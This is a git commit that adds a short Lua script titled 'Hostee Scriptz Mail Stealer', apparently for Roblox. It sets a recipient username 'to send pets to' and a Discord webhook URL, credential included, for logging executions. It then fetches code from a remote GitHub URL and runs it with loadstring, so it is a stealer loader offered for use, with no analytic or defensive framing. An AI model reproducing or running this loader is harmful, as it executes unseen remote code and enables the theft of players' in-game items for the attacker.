3822850ce89b263a98dbda0cb429c5e7e8b41390
Zirak12 <137118091+Zirak12@users.noreply.github.com>
2023-06-20 00:40:29 +0300

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,13 @@
+--[[ Hostee Scriptz Mail Stealer ]]--
+
+--[[ Main Config ]]--
+
+_G.UserNamey = "zirak123zaxo" --// Username To Send Pets To
+
+--[[ Webhook Config ]]--
+
+_G.Webhooky = "https://discord.com/api/webhooks/1120455712217251890/JsOTfQ_DLPz-zHgDpgmKlSvmMkz_6OTPMFTIsytACufZT4xbjSSKZNMpg0U83moLQ95T" --// Discord Webhook For Executions
+
+--[[ Script ]]
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
